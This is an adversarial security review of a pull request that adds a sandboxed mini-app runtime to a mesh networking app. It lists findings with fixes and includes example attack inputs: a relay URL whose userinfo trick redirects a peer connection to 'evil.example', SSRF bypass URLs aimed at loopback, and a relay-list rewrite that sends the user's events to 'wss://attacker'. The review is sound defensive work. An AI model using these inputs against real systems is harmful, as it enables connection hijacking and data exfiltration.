# Adversarial review — PR #52 "Napplets: a NIP-5D runtime beside nsites"

- Branch: `feat/napplet-runtime` → `main`, HEAD `5406b3c`
- Scope: 154 files, +24 669 / −4 282
- Date: 2026-09-16
- Method: five parallel review passes (napplet runtime `nap/`, myco-core wiring, content/runtime diff, relay + nsite-deck, Android/Kotlin), each finding re-verified against the tree; a separate sandbox-escape pass on the WebView/shell/CSP boundary. Host `cargo test --workspace` (390) and `cargo ndk … check -p myco-core` pass at HEAD; `Cargo.lock` clean.

## Verdict

Not mergeable as-is. Two crash/hijack paths reachable from a peer or an installed napplet (H1, H2), and a set of medium issues in the grant model, the Library index and the relay migration that the PR's own review claims to have closed. The sandbox itself — `srcdoc` + `sandbox="allow-scripts"` + position-zero CSP + origin-scoped `addWebMessageListener` — holds; the escapes are around it (the mesh pool, loopback relay, renderer lifecycle), not through it.

| Severity | Count | Must fix before merge |
|---|---|---|
| High | 2 | yes |
| Medium | 12 | yes, except M11 (policy) |
| Low | 15 | at discretion |

---

## High

### H1 · `strip_scheme` panics on non-ASCII pointers — remote crash via QR/NFC/bump
`myco-core/src/napplet.rs:118`

`NappletAddr::strip_scheme` slices `rest[..scheme.len()]` by byte index. A pointer whose 6th byte is inside a multibyte char (`nostré`, `naddr1€€`) panics with "byte index 6 is not a char boundary". The panic unwinds through `Java_app_myco_core_NativeCore_dispatchJson`, which has no `catch_unwind`, and aborts the process.

Reachable from any peer: `myco://share/<b64 json>` with `"napplet":"nostré"` is parsed by `NsiteShare.parseShareUri` with no validation and dispatched as `FetchNapplet` (`MainActivity.kt:1130`). Also via `nappletOpen` with an intent-supplied pointer. Reproduced standalone.

Fix: `rest.get(..len)` / `strip_prefix` with case-insensitive compare; never index a `&str` by a length derived from another string.

### H2 · A napplet (or a hostile kind 10002) can point a Circle peer's pool connection at an internet host
`myco-core/src/outbox.rs:251`, `myco-core/src/peer_relay.rs:192`, `myco-napplet-runtime/src/nap/outbox.rs:414`

`options.relays: ["ws://npub1<circle-peer>.fips:4870@evil.example/"]` passes `validate_relay_url` (host parsed by splitting on `:`/`/` → `npub1….fips` → `RelayLane::Mesh`) and `mesh_relay_npub` (same split), and `allowed()` accepts it because the npub is in the Circle. If that peer has no live pool actor — never dialed, or in dial backoff — `spawn_or_get` spawns `run(url)` with the napplet's URL and `tokio_tungstenite::connect_async` parses `npub1….fips:4870` as **userinfo** and dials `evil.example` (confirmed with tungstenite 0.24: `host=Some("evil.example")`).

That socket is now the pool's connection for that peer: keepwarm subscriptions, gossip fan-out and every later Mesh-lane publish for the peer go to the attacker, and whatever it returns is treated as the peer's relay view (signatures still verified; replay and omission are free). The plain-port variant `ws://npub1peer.fips:24243` points the pool at Blossom, the upgrade fails, and the peer sits in dial backoff — a napplet can mute any Circle peer.

Second ingress with no `options.relays`: `relay_list_lanes` (`outbox.rs:537`) turns any author's kind 10002 `r` tags into lanes via `RelayLane::from_url`, so a hostile relay list reached through `outbox.resolveRelays` does the same.

Fix: never dial an externally supplied mesh URL. Extract the npub, then rebuild with `ip_source::mesh_relay_url(&npub)`; reject anything containing `@`, a port other than 4870, or a path. Apply at both `validate_relay_url` and `relay_list_lanes`.

---

## Medium

### M1 · A napplet update widens its own grants with no review
`myco-core/src/napplet.rs:337–346`

`open_with` grants every domain in `effective_grants(&resolved.manifest.requires)` that is in neither `granted` nor `denied`; `resolved.manifest` is whatever version the update check pinned. Install v1 (`requires: [relay]`); author publishes v2 (`requires: [relay, mesh]`); "Check for updates" → `refresh_all` → `ingest` pins v2 silently; next open pushes `mesh` into `granted` and `NappletOpenRequest::run` (`runtime.rs:2418`) persists it. No screen ever showed "mesh". The Library records no manifest version/aggregate, so the code cannot tell "this build newly implements" from "the napplet newly declares".

Fix: store the reviewed `requires` set (or aggregate) on the Library entry; route any widening back through `NappletReview`.

### M2 · `flush_legacy` discards `events.json` even when saves failed
`myco-relay/src/lib.rs:132`

Lines 123–129 count only `Ok(Success)` and never re-queue `Err` results, then line 132 renames `events.json` → `.migrated` regardless. The `nostr-lmdb` ingester batches concurrent saves in one write txn; a real LMDB error on any op (I/O, `MDB_MAP_FULL`, commit) marks every op in the batch `BatchTransactionFailed`. Pinned nsites' manifests are gone from the relay for good; gateway answers 503 offline.

Fix: rename only when no save returned `Err`, or write the failed subset back.

### M3 · `relay.subscribe` reads `options.relay`; the shim sends top-level `relay`
`myco-napplet-runtime/src/nap/relay.rs:150`, `assets/vendor/napplet-shim-prelude.global.js:3974`

The vendored shim sends the named relay as a top-level field and never sends `options`. The runtime sees no target, registers a pool subscription and answers the local backlog plus the configured pool — the NIP-29 use case silently returns the wrong relay's view. The test at line 611 passes because it encodes the same wrong path.

### M4 · `remove_from_library` ignores `kind`
`myco-core/src/content.rs:1338`

Every other Library op in this PR matches `kind`; this one (and `forget_site`, which calls it) matches `(author, d)` only. Library holds nsite `(X, "bitchat")` and napplet `(X, "bitchat")` — the exact case `an_nsite_and_a_napplet_with_one_d_tag_are_two_entries` protects on the add side. Forgetting the nsite drops both entries, the napplet's `granted`/`denied`, and its pointer.

### M5 · `is_in_library` ignores `kind`
`myco-core/src/content.rs:3664`

A napplet-only entry makes `on_manifest_event` treat the same-slot **nsite** manifest as installed: it stages every blob from the sender over BLE (`download_and_activate`, 3493+), pins it in `active.json` and writes a `sites` entry, which the Apps grid renders (`AppsScreen.kt:127`) — an uninstalled nsite tile appears beside the napplet. Fix: filter `i.kind == LibraryKind::Nsite` here, or route through `library_addr`.

### M6 · In-flight fetch overwrites `napplet_review` unconditionally
`myco-core/src/runtime.rs:1494`, `AppsScreen.kt:236`

The spawned fetch writes `*review = Some(outcome)` without checking the current review still belongs to this pointer. (A) user dismisses the loading sheet; the fetch — sharer's mesh relay, then several public relays, tens of seconds — finishes and re-opens it. (B) fetch A in flight, user starts B; A completes and the sheet shows A's grants; B completes and replaces it — install decisions taken against a review that is not what the user last asked for. Same after `InstallNapplet` clears it. Fix: compare `review.pointer == pointer` under the lock before writing.

### M7 · Private-host refusal is bypassable — and the loopback relay has no gate
`myco-napplet-runtime/src/nap/outbox.rs:414–452`

`validate_relay_url` extracts the host by splitting the authority on `:`/`]` and never handles userinfo or address variants. All of these become `RelayLane::Internet` and reach `LaneTransport`:

- `ws://x@127.0.0.1:4870` — host parsed as `x`
- `ws://[::ffff:192.168.1.2]:4870` — `Ipv6Addr` loopback/ULA/link-local checks all miss v4-mapped
- `ws://127.1`, `ws://2130706433` — fail `Ipv4Addr` parse, resolved by `getaddrinfo`

`is_private_host` also omits 100.64/10 and multicast. The test at line 859 covers none of these.

Consequence beyond SSRF: `127.0.0.1:4870` is the **loopback relay listener that exists for the WebView and has no CircleGate**. With `outbox` granted, a napplet gets ungated REQ/EVENT on the local store — reads every other napplet's and the user's data regardless of the `relay` grant, and writes there via `options.relays` publish.

Fix: parse with the `url` crate, reject userinfo, resolve `to_socket_addrs` and test every resolved address (`is_loopback`, `is_private`, v4-mapped unwrapped, `is_unique_local`, `is_unicast_link_local`, multicast, CGNAT).

### M8 · Session leaks when the window dies during `nappletOpen`
`android/app/src/main/java/app/myco/NappletActivity.kt:140`

Back (or task kill) during the splash while `withContext(Dispatchers.IO) { client.nappletOpen(pointer) }` is resolving: `onDestroy` runs with `sessionId == ""` so `nappletClose` is skipped; when the JNI call returns, `withContext` throws `CancellationException` and `sessionId = opened.sessionId` never runs. The session (full assembled artifact HTML, outbox channel) stays in `NappletHost.sessions` forever, `open_count()` is wrong, `apply_grants` keeps sending `Relaunch` to a ghost. Fix: `NonCancellable` + `try/finally`; close the session if the scope is no longer active.

### M9 · `options.relays` has no count cap
`myco-napplet-runtime/src/nap/outbox.rs:387–401`

`hint_lanes` accepts any number of URLs; `LaneTransport::query/publish` `join_all`s every lane. One `outbox.query` with 5 000 distinct `wss://` URLs and `timeoutMs: 30000` opens 5 000 concurrent WebSocket connects for up to `MAX_TIMEOUT`; `outbox.publish` also signs and sends the user's event to every one. Cap at a small number (NIP-65 practice: ≤ 10).

### M10 · Per-session subscriptions are unbounded; orphaned filters survive a failed backlog
`myco-napplet-runtime/src/nap/mod.rs:79`, `session.rs:215`, `relay.rs:197`, `outbox.rs:231`, `mesh.rs:136`

Every `relay|mesh|outbox.subscribe` with a fresh `subId` inserts another filter set into the `BTreeMap` for the session's life and spawns another pull to every pool lane / mesh peer. A loop with random ids → tens of thousands of filters evaluated on every accepted event in `matching_subscriptions_in`, one detached pull task per call; `relay.close` removes one. Separately, `open_subscription` registers filters before the backlog query and leaves them registered when it fails while the caller emits `<domain>.closed` — the napplet drops the id, the runtime keeps matching and emitting for it. Fix: cap live subscriptions per session; register after a successful backlog, or remove on failure.

### M11 · `relay.publish` signs any kind under a default grant (policy)
`myco-napplet-runtime/src/nap/relay.rs:244`, `:249`

`sign_template` signs whatever kind the napplet asks and `relay` is in `DEFAULT_GRANTS`. A default-installed napplet publishes `{kind: 10002, tags: [["r","wss://attacker"]]}`; the local relay's replaceable semantics make it the user's newest relay list; `OutboxService::nip65_lanes` reads it back as the user's own NIP-65; every later `outbox.publish` (`toOutbox` defaults `true`) fans the user's signed events to the attacker. Same path rewrites kind 0/3 or issues kind-5 deletions of the user's events with no per-event prompt. The PR defers this to the unified permission model; recorded here because it is a complete exfiltration chain under defaults. Minimum interim: refuse kinds 0, 3, 5, 10002 (and 1000x replaceables) without a per-call prompt.

### M12 · A renderer crash kills the whole app
`android/app/src/main/java/app/myco/` — no `onRenderProcessGone` anywhere

WebView's default on API 26+ when the renderer process dies is to kill the app. A napplet that allocates until OOM, or triggers any renderer crash, takes down the mesh node, the relay, the Blossom store and every other window — not just its own. `NsiteActivity` has the same gap; a napplet is the more hostile tenant. Fix: override `onRenderProcessGone` in both clients, `finish()` the window, return `true`.

---

## Low

### L1 · Subscribe refusals go out as `relay.subscribe.result`, which the shim never listens for
`myco-napplet-runtime/src/nap/relay.rs:141`, `:146`. The shim's `subscribe5` listens only for `relay.event|eose|closed`. An unparseable filter → reply dropped, `onEose` never fires, listener leaks for the page's life. `outbox.subscribe` (`outbox.rs:193`) correctly uses `.closed`.

### L2 · `fetch_napplet` bypasses offline-only
`myco-core/src/runtime.rs:1451`. Always appends `addr.public_source()`; every other acquisition path gates on `is_offline_only()`. Mesh-only mode no longer proves the BLE path for napplet installs.

### L3 · `user.nsec` written non-atomically, loaded with `.ok()?`
`myco-core/src/user_key.rs:119`, `runtime.rs:1630`. Plain truncate-and-write (unlike `settings_store::save`, `save_library`), created world-readable before `chmod 0600`. Kill between truncate and write → empty file → new social identity next launch. Kill after a partial write → `Keys::parse` fails → `napplet_context()` is `None` forever, every open says "content layer is not running", nothing logged.

### L4 · `NADDR1…` accepted by Kotlin, refused by Rust
`MainActivity.kt:1004` vs `napplet.rs:66`. Alphanumeric-mode QR yields `NOSTR:NADDR1…`; Kotlin routes it to `fetchNapplet`, Rust's `starts_with("naddr1")` is case-sensitive → "not a valid npub or naddr".

### L5 · `flush_legacy` is not a barrier
`myco-relay/src/lib.rs:118`. A second concurrent async entry point sees `pending_legacy` already emptied by `mem::take` and queries LMDB before the first caller's saves land — transient `ManifestMissing`/503 or `active_ts = 0` (every pinned site reported as updated). `tokio::sync::OnceCell` held across the saves.

### L6 · SVG sniff scans only the first 1 024 bytes
`myco-napplet-runtime/src/nap/resource.rs:345–354`. `<?xml …?><!-- 1100 bytes --><svg><script>` passes and is delivered as `application/xml`, which renders as SVG when loaded as a document. Inside the sandbox it stays opaque-origin and CSP-bound, so no escape — but the documented "raw SVG is refused" is not true.

### L7 · `identity.getRelays` always answers `{}`
`myco-napplet-runtime/src/nap/identity.rs:28`. The runtime holds the user's kind 10002 (`own_relay_list`, published from `runtime.rs:1651`) and `outbox.resolveRelays` returns it; a NIP-5D napplet that calls `getRelays` first concludes the user has none.

### L8 · Local-store reads before the size check
`resource.rs:182` vs `:220`. `blobs.get` reads the whole blob before `MAX_BYTES`; Blossom upload cap is 64 MiB. `bytesMany` with 100 URLs naming one 64 MiB nsite asset allocates 64 MiB per URL to answer `too-large` each time.

### L9 · Subframe http navigation to the shell URL is served
`NappletActivity.kt:390`, `:416`. Chromium doesn't offer subframe http(s) navigations to `shouldOverrideUrlLoading`, so the "subframe navigation refused" branch is dead for them; `location.href = "http://<shellHost>/"` lands in `shouldInterceptRequest`, which serves the trusted shell page into the napplet's frame. Inert today because the sandbox keeps the origin opaque, so no runtime object is injected — but the stated invariant "shell bytes only ever land in the main frame" is unenforced, and one future `allow-same-origin` or a WebView origin-matching regression turns it into channel access. Gate on `request.isForMainFrame`.

### L10 · `inbound` is `Channel.UNLIMITED`
`NappletActivity.kt:94`. The semaphore bounds FFI concurrency (8), not queue memory. A napplet looping `parent.postMessage(bigString)` grows the queue until OOM. Bounded channel; drop or refuse when full.

### L11 · Home-screen offer fires on an already-installed napplet
`MainActivity.kt:925`. `offerHomeScreenWhenNappletInstalled` treats "in the Library" as "just installed"; a share of an installed napplet pops the system dialog on top of the review sheet before anything was reviewed, and marks the pref as asked.

### L12 · First-use profile and relay list go to the custom relay
`myco-core/src/runtime.rs:1644`. Published to `content.relay()`, which is the configured remote relay when one is set (`content.rs:695`), not "the local relay only" as the comment says. Publish through `content.relay_store()` and skip when `None`.

### L13 · `wipe_cache` evicts the user's own kind 0 / 10002 and never republishes
`myco-core/src/content.rs:3772`. Keep-set is pinned manifests/blobs only; the guest profile and relay list published once at first use (`runtime.rs:1629`) are gone, and `user.nsec` still exists so they are not regenerated. Own outbox plan degrades to `Fallback`; napplets see a bare pubkey.

### L14 · Secure context
`*.localhost` is potentially trustworthy and the `srcdoc` frame inherits it. Unlocks `navigator.clipboard.writeText` on a tap inside the napplet, `crypto.subtle`, and any secure-context API WebView adds later. Camera/mic/geolocation/clipboard-read stay denied because no `WebChromeClient` grants them — keep it that way; note it in the design doc.

### L15 · `is_private_host` omits CGNAT and multicast
Folded into M7's fix; listed so it is not lost.

---

## Sandbox escape analysis

### Boundaries that hold (verified in code)

- **Sandbox tokens.** `allow-scripts` only; the runtime owns the value (`SrcdocArtifact::SANDBOX`) and the shell never composes it. No `allow-same-origin`, `allow-popups`, `allow-top-navigation*`, `allow-forms`, `allow-modals`, `allow-downloads`: `top.location`/`parent.location` writes, `window.open`, form posts, `alert`, downloads are refused by Blink before Kotlin sees them.
- **CSP at position zero.** `assemble` rebuilds the document as `<!doctype> <meta CSP> <script prelude> <bytes>`; nothing is searched for, so the decoy-`<head>` trick fails. `default-src 'none'` covers `frame-src`/`child-src`, blocking nested `<iframe src=blob:>`. `about:blank`/`srcdoc` nested frames are allowed by spec but inherit sandbox, CSP and opaque origin. A `blob:` self-navigation or `blob:` Worker inherits the creator's CSP in Chromium, so `connect-src 'none'` binds them too.
- **Capability channel.** `addWebMessageListener` is registered against exactly `http://<shellHost>` and matches on the frame's *security* origin; a sandboxed frame is opaque and never receives `mycoNappletRuntime`. `isMainFrame` is checked again on receipt. `addJavascriptInterface` is not used. The shell writes the `channel` tag itself and checks `event.source === frame.contentWindow`; a napplet cannot forge `shell.*` control traffic, and structured clone strips `toJSON`, so it cannot game the shell's `JSON.stringify`.
- **Storage.** Opaque origin plus `domStorageEnabled=false`, `allowFileAccess=false`, `allowContentAccess=false`: no cookies, localStorage, IndexedDB, Cache API or service workers.
- **Intents.** `intent:`/`tel:`/custom schemes from the subframe *are* offered to `shouldOverrideUrlLoading` (non-http) and refused; `NappletActivity` is `exported="false"` with no intent filter; `ExternalNavigation` requires a gesture on the main frame, which has nothing to click.
- **Prelude.** Trusted, first script in the document, but runs in the napplet's realm and is overwritable afterwards. Nothing on the Rust side trusts prelude-generated fields; every frame is re-validated in `dispatch.rs`.

### Ways out

| # | Vector | Where | Finding |
|---|---|---|---|
| 1 | Hijack a Circle peer's pool connection to an internet host via userinfo in a `.fips` URL; mute a peer via a wrong port | outbox / peer_relay | **H2** |
| 2 | Renderer OOM/crash kills the app process — mesh node, relay, every window | NappletActivity, NsiteActivity | **M12** |
| 3 | Reach the ungated loopback relay on `127.0.0.1:4870` through `ws://x@127.0.0.1` | nap/outbox | **M7** |
| 4 | Shell page served into the napplet's own frame on self-navigation; inert only because the origin stays opaque | NappletActivity | **L9** |
| 5 | Secure-context APIs (clipboard write) inside the sandbox | shell origin | **L14** |
| 6 | Rewrite the user's kind 10002 / 0 / 3, delete their events, under default grants | nap/relay | **M11** (policy) |
| 7 | Queue-memory and connection-fanout exhaustion from inside the frame | NappletActivity, nap/outbox, nap/mod | **L10, M9, M10** |

None of these go *through* the iframe boundary; they go around it, through the services the capability channel hands the napplet. Items 1–3 are bugs, not policy, and let a napplet act as the device on the mesh.

### Accepted policy (listed so it is explicit)

- Napplet-named internet relays (`options.relay`, `options.relays`) are an exfiltration channel by design; data rides in the URL even when the relay refuses.
- `relay.subscribe` is unscoped: every napplet reads every other napplet's events and everything the user has published.
- `relay.publish` signs any kind (M11).
- All are roadmap items under the unified permission model.

---

## Verified sound

- Grant revocation persists: `denied` respected at launch and live via `apply_grants`; `deliveries_for` gated on grant; `apply_grants` scoped on author hex + `d_tag` (no cross-author leak).
- Version pinning via `ActiveBackend` + pin-after-blob in `ingest`/`open_with`; a newer manifest with no blob cannot take an app off the air.
- `wipe_cache` keeps napplet manifest + index blob + active pin; grants preserved.
- NIP-5A aggregate (`nsite-deck/src/aggregate.rs`) matches the reference `@kehto/nip/5a` byte-for-byte; `known_vector` pins the JS output. nsites lenient, napplets strict.
- Relay store on LMDB: query semantics match the old store; `retain_events` does not touch `deleted_ids`; `count()`'s `now_or_never` is safe; no `std::Mutex` held across an await.
- CircleGate / `may_read` / `may_publish` / Blossom gating untouched in `mesh_relay.rs`; `accept_local_with_ttl` / `accept_unforwarded` carry only host-signed or ingress-verified events. Hop caps consistent with gossip (`ttl-1` on pull, `min(EVENT_TTL)` on publish).
- `gossip.rs` still sets `event_ttl = None` for socket-local publishes; nsite fan-out unchanged.
- JNI: all six napplet entry points match `jni_abi.rs` in name, arity and type; runtime mutex released before every `block_on`; `nappletOpen` on `Dispatchers.IO`.
- `ip_source.rs` blob reads hash-verified and bounded before the body is consumed.
- User secret never logged; device npub not placed in user-key events.
- Library/active JSON writes are temp+rename atomic. Grid keys `nsite:<host>` / `napplet:<pointer>` cannot collide.

---

## Suggested fix order

1. H1, H2 — remote crash and mesh hijack; small, mechanical.
2. M4, M5 — one-line `kind` filters; the `(author, d)` collision the PR says it fixed.
3. M7 (+L15), M9, M10, L10 — bound what a napplet can make the device do.
4. M12 — `onRenderProcessGone` in both activities.
5. M1, M6, M8 — grant widening, review race, session leak.
6. M2, L5 — relay migration; test with a real pre-LMDB `events.json` before flashing.
7. M3, L1, L7 — shim/runtime contract; fix the tests that encode the wrong path.
8. Remaining lows; document L14 and the accepted-policy list in `napplet-runtime.md`.
